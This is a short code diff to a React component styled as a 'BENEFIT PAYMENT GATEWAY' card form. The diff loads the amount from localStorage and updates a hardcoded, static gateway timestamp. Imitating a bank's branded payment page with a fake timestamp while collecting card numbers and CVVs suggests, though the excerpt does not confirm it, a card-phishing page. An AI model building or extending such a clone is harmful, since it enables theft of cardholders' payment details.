@@ -14,7 +14,11 @@ export default function BenefitPaymentGateway() {
   const router=useRouter()
     const inputRef = useRef<HTMLInputElement>(null)
   const keypadRef = useRef<HTMLDivElement>(null)
-  const total = 10
+  const [total,setTotal]=useState('0')
+  useEffect(()=>{
+const amount=localStorage.getItem('amount')
+    setTotal(amount!)
+  },[])
   const data = { cardNumber, cardholderName, cvv, month, year }
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault()
@@ -107,7 +111,7 @@ name="paypage"
               <div className="headingalignment">
                 <div style={{ color: 'red', textAlign: 'center' }}>
                   <b>BENEFIT PAYMENT GATEWAY</b> <br />
-                  <b>24-04-2025 08:12</b>
+                  <b>08-05-2025 08:12</b>
                 </div>
               </div>
               <div></div>
@@ -177,7 +181,7 @@ name="paypage"
                               className="col-lg-6 formwidth"
                               style={{ float: 'left' }}
                             >
-                              <b>BD{total}</b>
+                              <b>BD  {total}</b>
                             </div>
                           </div>
                           <div className="col-lg-12" style={{ float: 'left' }}>
